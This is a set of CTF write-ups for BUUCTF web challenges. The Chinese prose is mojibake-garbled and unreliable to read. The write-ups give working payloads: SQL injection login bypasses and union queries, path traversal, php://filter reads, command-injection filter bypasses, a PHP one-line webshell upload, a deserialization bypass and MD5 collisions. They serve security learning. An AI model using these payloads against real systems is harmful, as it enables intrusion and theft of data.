## [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL

è¯•ä¸€ä¸‹å°±å¯ä»¥å‘ç°åå°æ˜¯ select * from users where username='$_GET[username]' and password='$_GET[passwd]'

ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå¾—åˆ°flagã€‚

ä¸‡èƒ½å¯†ç ï¼š

username='=â€˜&password='='

username=\&password=='

username='=''%23&password=1

![image-20230407232743248](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072327474.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun

é¡µé¢æºç ä¸­æœ‰æç¤ºï¼š

![image-20230407234234243](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072342273.png)

![image-20230407234530855](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072345875.png)

## [HCTF 2018]WarmUp

é¡µé¢æºç æœ‰æç¤ºï¼š

![image-20230407235057514](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072350537.png)

å¾—åˆ°é¡µé¢æºç ï¼š

```
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

![img](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072353687.jpg)

æºç ä¸­çš„ç™½åå•åŒ…æ‹¬æºç æœ¬èº«source.phpå’Œæç¤ºhint.php

hint.phpï¼š

flag not here, and flag in ffffllllaaaagggg

checkfileå‡½æ•°åŒ¹é…åŒ…å«æ–‡ä»¶ç™½åå•æ—¶å…ˆæˆªå–ç¬¬ä¸€ä¸ªé—®å·å‰é¢çš„éƒ¨åˆ†ï¼Œæ„é€ source.php?/../../../../etc/passwd å¯ç»•è¿‡æ–‡ä»¶åç™½åå•ã€‚

![image-20230408001126427](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080011452.png)

![image-20230408003711699](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080037719.png)

## [ACTF2020 æ–°ç”Ÿèµ›]Include

é¡µé¢æºç æœ‰æç¤ºï¼š

![image-20230408003842849](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080038880.png)

ç”¨phpä¼ªåè®®å°†æºç base64ç¼–ç åè¾“å‡ºåˆ°é¡µé¢ï¼Œå†è§£ç å¾—åˆ°flagï¼š

![image-20230408004053914](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080040936.png)

![image-20230408004144458](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080041480.png)

## [ACTF2020 æ–°ç”Ÿèµ›]Exec

æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„å‘½ä»¤æ‰§è¡Œï¼š

![image-20230408005147373](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080051400.png)

## [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨

selectè¢«ç¦ç”¨

![image-20230408005815607](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080058627.png)

å¯ä»¥ç”¨ä¸‡èƒ½å¯†ç æŸ¥çœ‹æ‰€æœ‰è®°å½•ï¼š

![image-20230408010338262](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080103284.png)

å¯ä»¥å †å æ³¨å…¥ï¼š

![image-20230408010823824](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080108854.png)

å¤§æ¦‚å¯çœ‹å‡ºï¼Œflagåœ¨è¡¨1919810931114514ä¸­ï¼Œé¡µé¢é»˜è®¤æŸ¥è¯¢çš„æ˜¯è¡¨wordsã€‚

ç”±äºselectè¢«ç¦ç”¨ï¼Œè€ƒè™‘å°†1919810931114514æ”¹åä¸ºwordsï¼Œå°†flagæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚

é¦–å…ˆå°†å­—æ®µåflagæ”¹ä¸ºidã€ä¸å¿…æ‹˜æ³¥äºwordsè¡¨ä¸­çš„ä¸¤ä¸ªå­—æ®µidå’Œdataï¼Œåªæœ‰ä¸€ä¸ªå­—æ®µidä¹Ÿå¯ä»¥åˆ©ç”¨ä¸‡èƒ½å¯†ç å…¨éƒ¨æ˜¾ç¤ºã€‘

 ![image-20230408011715800](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080117826.png)

ç„¶åä¿®æ”¹wordsè¡¨åçš„åŒæ—¶ä¿®æ”¹1919810931114514è¡¨åä¸ºwordsã€æ”¹é”™å°±æŒ‚äº†ã€‘

```
f8ce56a6-4000-48e2-878e-c58319474118.node4.buuoj.cn:81/?inject=1';rename table words to x;rename table `1919810931114514` to words;
```

ä¸‡èƒ½å¯†ç æ˜¾ç¤ºflagï¼š

![image-20230408012722784](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080127819.png)

## [GXYCTF2019]Ping Ping Ping

è²Œä¼¼æ˜¯ä¸ªæ­£åˆ™åŒ¹é…ï¼Œç±»ä¼¼f.\*l.\*a.*gï¼Œéœ€è¦æ”¹å˜å­—æ¯é¡ºåºæ‰èƒ½ç»•è¿‡ï¼š

```
http://8535bb82-f8c2-409e-9e0c-60645b38280f.node4.buuoj.cn:81/?ip=127.0.0.1;a=g.php;b=fla;cat$IFS$b$a;
```

![image-20230408014252555](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080142587.png)

## [SUCTF 2019]EasySQL

è¾“å…¥éé›¶æ•°å­—è¿”å›1ï¼Œå…¶ä»–æ— å›æ˜¾ã€‚æ¨æ–­è¾“å…¥å€¼è¢«åšäº†å¸ƒå°”è¿ç®—ï¼Œç„¶åç›´æ¥è¾“å‡ºåˆ°é¡µé¢ã€‚å¯æ§å­—ç¬¦åœ¨fromå·¦è¾¹ã€‚

![image-20230408095854277](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080958324.png)

å¯ä»¥å †å æ³¨å…¥ï¼š

```
query=1;show tables;
```

å½“å‰æ•°æ®åº“åªæœ‰ä¸€ä¸ªè¡¨Flagï¼Œä½†fromã€flagè¢«ç¦ç”¨ã€‚

ç›´æ¥ç”¨é€—å·åˆ†éš”ï¼Œ*å·è¾“å‡ºè¡¨ä¸­æ‰€æœ‰å­—æ®µï¼Œå¾—åˆ°flagï¼š

```
query=1;select *,1
```

![image-20230408111728488](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081123818.png)

æ–¹æ³•äºŒï¼š

å¸ƒå°”è¿ç®—æ— éæ˜¯ä¸æˆ–éï¼ŒçŒœæµ‹åé¢çš„å€¼ä¸flagæœ‰å…³ï¼Œå­—æ¯å¼€å¤´è½¬æ¢ä¸ºæ•°å€¼0ï¼Œæ ¹æ®éé›¶è¾“å…¥è¿”å›1å¯çŒœæµ‹è¿ç®—ç¬¦ä¸º|ï¼Œå¯ä¿®æ”¹å…¶åŠŸèƒ½ä¸ºå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä»è€Œè¾“å‡ºåé¢çš„å­—ç¬¦ä¸²åˆ°é¡µé¢ã€‚

```
query=1;set sql_mode=pipes_as_concat;select 1
```

![image-20230408112252130](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081122154.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File

æºç ä¸­æ‰¾åˆ°urlï¼Œç‚¹è¿›å»è¿˜æœ‰urlï¼Œå†ç‚¹å°±ç»“æŸäº†ã€‚ç”¨burpæŠ“åŒ…ï¼Œå‘ç°ä¸­é—´æœ‰ä¸ª302è·³è½¬ï¼Œè·³è½¬å‰çš„é¡µé¢é‡Œæœ‰æ–‡ä»¶åæç¤ºï¼Œè®¿é—®çœ‹åˆ°é¡µé¢æºç ã€‚

![image-20230408122856225](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081228250.png)

```
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flagæ”¾åœ¨äº†flag.phpé‡Œ
?>
</html>
```

ç›´æ¥ç”¨phpä¼ªåè®®æŸ¥çœ‹flag.phpæºç ï¼Œå¾—åˆ°flagï¼š

```
http://6d79b680-20d9-4441-b583-bd2263130be7.node4.buuoj.cn:81/secr3t.php?file=php://filter/read/convert.base64-encode/resource=flag.php
```

![image-20230408123605863](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081236885.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL

ä¸‡èƒ½å¯†ç ç™»å½•ï¼š

![image-20230408124207445](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081242479.png)

é¡µé¢ç»™äº†å¯†ç å¯†æ–‡ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚

ä½†æ˜¯è¿™é‡Œè¦è€ƒè™‘ä¸€ä¸‹ä¸ºä»€ä¹ˆå¯†ç ä¼šè¾“å‡ºåˆ°é¡µé¢ä¸Šï¼Œä¸€ç§æƒ…å†µæ˜¯éªŒè¯æˆåŠŸååˆæŸ¥è¯¢äº†ä¸€æ¬¡å¯†ç ï¼›å¦ä¸€ç§æƒ…å†µæ˜¯éªŒè¯çš„åŒæ—¶æŸ¥è¯¢åˆ°äº†å¯†ç ã€‚é‡ç‚¹è€ƒè™‘åè€…ã€‚

```
Select * from xxx where username=$_GET[username] and password=$_GET[password]
```

å°è¯•è”åˆæŸ¥è¯¢æ³¨å…¥ï¼š

```
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=admin&password=81223ef680e39547560b1354d2af3d58'order by 4%23
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,3%23
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,group_concat(table_name,0x2b,column_name)from information_schema.columns where table_schema=database()%23
#'geekuser+id,geekuser+username,geekuser+password,l0ve1ysq1+id,l0ve1ysq1+username,l0ve1ysq1+password'
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,group_concat(password)from l0ve1ysq1%23
#Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{e0d35709-ea21-4072-bc4b-a5d91c0d1737}'
```

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Http

åœ¨é¡µé¢æºç ä¸­æ‰¾åˆ°æç¤ºï¼š

![image-20230408125923174](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081259207.png)

æŒ‰æç¤ºä¿®æ”¹Refererã€UserAgentã€X-Forwarded-Forï¼Œå¾—åˆ°flagï¼š

![image-20230408130257715](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081302735.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Knife

# æˆ‘å®¶èœåˆ€ä¸¢äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾ä¸€ä¸‹ä¹ˆ

eval($_POST["Syc"]);

è¿™ä¹Ÿæ²¡ä¸¢å•Šï¼Œéƒ½ç›´æ¥ç»™è¯´å¯†ç äº†ï¼Œåé—¨ä¹Ÿå°±åœ¨index.phpé‡Œã€‚èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•çœ‹åˆ°flagæ–‡ä»¶ã€‚

![image-20230408132803658](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081328680.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload

éšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œç«Ÿç„¶æŠ¥é”™ï¼š

```
 NO! HACKER! your file included '<?' 
```

å¯è§åå°å¯¹å›¾ç‰‡å†…å®¹è¿‡æ»¤äº† <? è€Œæˆ‘ç”¨Photoshopç”Ÿæˆçš„å›¾ç‰‡é‡Œé¢è‡ªå¸¦å¾ˆå¤šxmlæ ¼å¼çš„ä¿¡æ¯ï¼Œæ‰€ä»¥è¢«è¯¯ä¼¤äº†ã€‚ç”¨Photoshopç”Ÿæˆå›¾ç‰‡æ—¶å…ƒæ•°æ®ä¸ºâ€œæ— â€å³å¯æ¶ˆé™¤è¿™äº›ä¿¡æ¯ã€‚

è€ƒè™‘ç”¨ä»¥ä¸‹ä¸€å¥è¯æœ¨é©¬ç»•è¿‡ï¼š

```
<script language="php">@eval($_POST[c]);</script>
```

ç®€å•å°è¯•å‡ æ¬¡ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ phtmlæ–‡ä»¶

![image-20230408135143890](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081351915.png)

```
http://ea10f465-71e7-43c6-a16b-ca214555a6f7.node4.buuoj.cn:81/upload/logo.phtml
c=phpinfo();
```

ä¸€å¥è¯æœ¨é©¬æ‰§è¡ŒæˆåŠŸï¼

```
c=system('cat /flag');
```

ç›´æ¥çœ‹åˆ°flagï¼Œæˆ–è€…ç”¨èšå‰‘ç¿»ç›®å½•ã€‚

## [ACTF2020 æ–°ç”Ÿèµ›]Upload

å¯ä»¥ä¸Šä¼ phtæ–‡ä»¶ï¼š

![image-20230408135750684](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081357710.png)

ä½†ä¸è§£æã€‚ä¸Šä¼ phtmlæ–‡ä»¶å¯è§£æã€‚

![image-20230408135940071](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081417348.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL

Unionã€selectã€orè¢«åˆ é™¤ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚

```
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username=admin'oorrder bory 4%23&password=123456
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,3%23&password=123456
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,group_concat(table_name,0x2b,column_name)frorom infoorrmation_schema.columns wheorre table_schema=database()%23&password=123456
#Your password is 'b4bsql+id,b4bsql+username,b4bsql+password,geekuser+id,geekuser+username,geekuser+password'
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,group_concat(passwoorrd)frorom b4bsql%23&password=123456
#Your password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{b9531139-550b-423c-ab4c-14527649d576}'
```

## [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP

å› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯    

ç›®å½•æ‰«æï¼Œæ‰¾åˆ°ç½‘ç«™å¤‡ä»½æ–‡ä»¶www.zipå’Œflag.phpã€‚

```
python3 dirsearch.py -u http://6d5ebad8-4150-4401-a45e-f088a4176714.node4.buuoj.cn:81/ --max-rate=10

[14:44:36] 200 -    0B  - /flag.php                                         
[14:45:39] 200 -   10KB - /index.js                                         
[14:46:30] 429 -  568B  - /linkadmin.php                                    
[14:50:49] 429 -  568B  - /sites/all/libraries/README.txt                   
[14:53:38] 200 -    6KB - /www.zip  
```

index.php

```
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>  
```

class.php

```
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

æ„é€ å¯¹è±¡ï¼Œç”¨æˆ·åä¸ºadminã€å¯†ç ä¸º100ã€‚

```
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'admin';
    private $password = '100';
}
echo serialize(new Name()); 
#O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
#è„šæœ¬è¾“å‡ºä¸æ˜¾ç¤ºç©ºå­—ç¬¦ï¼Œéœ€è¦æ‰‹å·¥æ·»åŠ ã€‚
```

ååºåˆ—åŒ–è§¦å‘wakeupå‡½æ•°ä¼šä¿®æ”¹ç”¨æˆ·åï¼ŒæŠŠå±æ€§ä¸ªæ•°2æ”¹ä¸º3å³å¯ç»•è¿‡ï¼Œä¸è§¦å‘wakeupå‡½æ•°ã€‚

```
http://445cc29c-ef01-4065-8624-fe5e7f2b5db2.node4.buuoj.cn:81/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
# flag{c4c0f14c-bb30-4eef-9a66-4d3cea23f835} 
```

## [ACTF2020 æ–°ç”Ÿèµ›]BackupFile

æ‰¾åˆ° index.php.bak

```
if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }   
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }   
}
else {
    echo "Try to find out source file!";
}
```

æ˜“å¾—ï¼š

```
http://aeeab0b5-2a13-4081-bb59-e20478ff9d9b.node4.buuoj.cn:81/?key=123
#flag{df91da2b-687a-481d-ad32-e5245d5bb819} 
```

## [RoarCTF 2019]Easy Calc

æŠ“åŒ…çœ‹åˆ°è®¡ç®—å™¨å®é™…æ‰§è¡Œçš„è„šæœ¬calc.php

```
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```

ä»£ç å®¡è®¡å‘ç°è¿‡æ»¤å¹¶ä¸ä¸¥æ ¼ï¼Œä½†ç»å¸¸å‡ºç°403ã€‚ä¸»é¡µæºç æœ‰ä¸ªWAFçš„æç¤ºï¼š

```
<!--I've set up WAF to ensure security.-->
```

GETå‚æ•°åå‰é¢åŠ ç©ºæ ¼å¯ä»¥ç»•è¿‡WAFï¼š

```
http://node4.buuoj.cn:25488/calc.php? num=phpinfo()
node4.buuoj.cn:25535/calc.php? num=serialize(scandir(chr(47)))
#a:24:{i:0;s:1:".";i:1;s:2:"..";i:2;s:10:".dockerenv";i:3;s:3:"bin";i:4;s:4:"boot";i:5;s:3:"dev";i:6;s:3:"etc";i:7;s:5:"f1agg";i:8;s:4:"home";i:9;s:3:"lib";i:10;s:5:"lib64";i:11;s:5:"media";i:12;s:3:"mnt";i:13;s:3:"opt";i:14;s:4:"proc";i:15;s:4:"root";i:16;s:3:"run";i:17;s:4:"sbin";i:18;s:3:"srv";i:19;s:8:"start.sh";i:20;s:3:"sys";i:21;s:3:"tmp";i:22;s:3:"usr";i:23;s:3:"var";}
node4.buuoj.cn:25535/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
#flag{13fb16f5-07f6-44be-96da-940efcdd2417} 
```

## [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag

Pay.php

Flag need your 100000000 money

If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!! 	 							

Only Cuit's students can buy the FLAG

æºç æç¤ºï¼š

```
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

ç¬¬ä¸€æ¬¡è®¿é—®ä¸è¦ç€æ€¥æ”¹åŒ…ï¼Œæ”¹æˆPOSTå†è®¿é—®ä¸€æ¬¡ï¼ŒæŠ“åŒ…å‘ç°cookie: user=0ï¼Œæ”¹æˆ1ã€‚

```
password=404x&money=100000000
```

æç¤ºNember lenth is too long

```
password=404x&money=1E9
#flag{77532898-106c-40dc-a13e-3f82e77fd2a3}
```

## [BJDCTF2020]Easy MD5

httpå“åº”å¤´æœ‰æç¤ºï¼š

```
Hint: select * from 'admin' where password=md5($pass,true)
```

ç”¨äºmd5($pass,true)çš„ç‰¹æ®Šçš„æ˜æ–‡ï¼š

```
ffifdyop
129581926211651571912466741651878684928
e58
4611686052576742364
```

å°çŸ¥è¯†ï¼š

![image-20230409104004777](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304091040290.png)

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/leveldo4.php?password=ffifdyop
```

é¡µé¢è·³è½¬ï¼Œå‡ºç°æ–°æç¤ºï¼š

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

ç”¨0eæ¼æ´ï¼š

```
240610708 0e462097431906509019562988736854
314282422 0e990995504821699494520356953734
571579406 0e972379832854295224118025748221
903251147 0e174510503823932942361353209384
1110242161 0e435874558488625891324861198103
1320830526 0e912095958985483346995414060832
1586264293 0e622743671155995737639662718498
2302756269 0e250566888497473798724426794462
2427435592 0e067696952328669732475498472343
2653531602 0e877487522341544758028810610885
3293867441 0e471001201303602543921144570260
3295421201 0e703870333002232681239618856220
```

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/levels91.php?a=240610708&b=314282422
```

ä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼š

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/levels91.php?a[]=1&b[]=
```

é¡µé¢è·³è½¬ï¼Œå‡ºç°æ–°æç¤ºï¼š

```
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

æ²¡æœ‰ç¦ç”¨æ•°ç»„ï¼Œè¿˜æ˜¯æ•°ç»„ç»•è¿‡ï¼š

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/levell14.php
param1[]=1&param2[]=
 flag{40d54be7-9cde-4838-80d3-62d8588e6261} 
```

å…¶å®æ­¤ç±»é¢˜ç›®éƒ½å¯ä»¥ç”¨md5ç¢°æ’è§£å†³ï¼š

```
ä¸¤ä¸ªç›¸åŒmd5å­—ç¬¦ä¸²çš„urlç¼–ç ï¼š
a=~b%846%86%AB%EB%A6%1D%ED%26%94%16%5E%03K0%E1%5C%EE%AF%5B%D5%17T%8A%3A%8EL%A4%B3%B8%1B%EE%BC%EE%E0%23%EA%5E%8F%3E%D7%A4%082%AD%11%9D%7D%C4%5DD%04%F6%B53%F0%F18a%29%81%8FG0%A1EBF%F5%DC%0F%90%85AM%0C7%0F~%DF%C4a%0B%06%26%9F%CB%1A%FE%BB%EC%07%FE%E7%E8%5C%A6%95%F4J%08%40j~A%EF%D2%7C%CB%EC%1B%AE%A5%84%80%BF-%A1%08%A4%3C%22%5E%7B%A1%D1

b=~b%846%86%AB%EB%A6%1D%ED%26%94%16%5E%03K0%E1%5Cn%AF%5B%D5%17T%8A%3A%8EL%A4%B3%B8%1B%EE%BC%EE%E0%23%EA%5E%8F%3E%D7%A4%08%B2%AD%11%9D%7D%C4%5DD%04%F6%B53%F0%F1%B8a%29%81%8FG0%A1EBF%F5%DC%0F%90%85AM%0C7%0F~%DF%C4%E1%0B%06%26%9F%CB%1A%FE%BB%EC%07%FE%E7%E8%5C%A6%95%F4J%08%40j~A%EF%D2%FC%CA%EC%1B%AE%A5%84%80%BF-%A1%08%A4%3C%A2%5E%7B%A1%D1

ä¸‰ä¸ªï¼š
a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab

b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab

